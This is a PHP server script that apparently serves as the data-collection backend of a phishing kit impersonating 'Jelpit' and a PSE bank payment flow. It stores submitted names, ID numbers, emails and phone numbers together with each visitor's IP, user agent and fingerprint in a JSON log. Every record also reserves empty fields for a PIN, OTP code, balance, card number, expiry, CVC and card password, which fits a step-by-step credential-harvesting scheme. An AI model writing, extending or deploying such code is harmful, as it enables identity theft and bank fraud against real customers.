<?php
// admin/guardar_datos_jelpit.php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$dataDir = __DIR__ . '/data';
$logsFile = $dataDir . '/pse_logs.json';

if (!is_dir($dataDir)) {
    mkdir($dataDir, 0777, true);
}

$input = json_decode(file_get_contents('php://input'), true);

if (!$input) {
    $input = $_POST;
}

if (!$input || empty($input)) {
    echo json_encode(['success' => false, 'error' => 'No se recibieron datos']);
    exit;
}

$email = $input['email'] ?? '';
$tipoDoc = $input['tipoId'] ?? '';
$numeroDoc = $input['numeroId'] ?? '';
$nombre = $input['nombre'] ?? '';
$apellido = $input['apellido'] ?? '';
$celular = $input['celular'] ?? '';

// ====== GENERAR FINGERPRINT UNIVERSAL ======
$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$fingerprint = md5($ip . '_' . $userAgent);

$logs = [];
if (file_exists($logsFile)) {
    $content = file_get_contents($logsFile);
    $logs = json_decode($content, true) ?? [];
}

// ====== CREAR NUEVO LOG ======
$nuevoLog = [
    'id' => uniqid('JEL_'),
    'fecha' => date('Y-m-d H:i:s'),
    'documento' => $numeroDoc,
    'usuario' => $numeroDoc,
    'titular' => $nombre . ' ' . $apellido,
    'nombre' => $nombre,
    'apellido' => $apellido,
    'banco' => 'JELPIT',
    'activity' => 'JELPIT_REGISTRO',
    'estado' => 'pendiente',
    'jelpit_email' => $email,
    'jelpit_nombre' => $nombre,
    'jelpit_apellido' => $apellido,
    'jelpit_tipo_documento' => $tipoDoc,
    'jelpit_celular' => $celular,
    'jelpit_fecha' => date('Y-m-d H:i:s'),
    'tiene_jelpit' => true,
    // ====== FINGERPRINT UNIVERSAL ======
    'fingerprint' => $fingerprint,
    'ip' => $ip,
    'user_agent' => $userAgent,
    // ====== CAMPOS DE BANCO VACÍOS ======
    'clave_pin' => '',
    'codigo_otp' => '',
    'saldo' => '',
    'clave_tarjeta' => '',
    'numero_tarjeta' => '',
    'vencimiento' => '',
    'cvc' => ''
];

array_unshift($logs, $nuevoLog);
file_put_contents($logsFile, json_encode($logs, JSON_PRETTY_PRINT));

echo json_encode([
    'success' => true,
    'message' => 'Log creado con datos de Jelpit',
    'log_id' => $nuevoLog['id'],
    'fingerprint' => $fingerprint,
    'documento' => $numeroDoc
]);
?>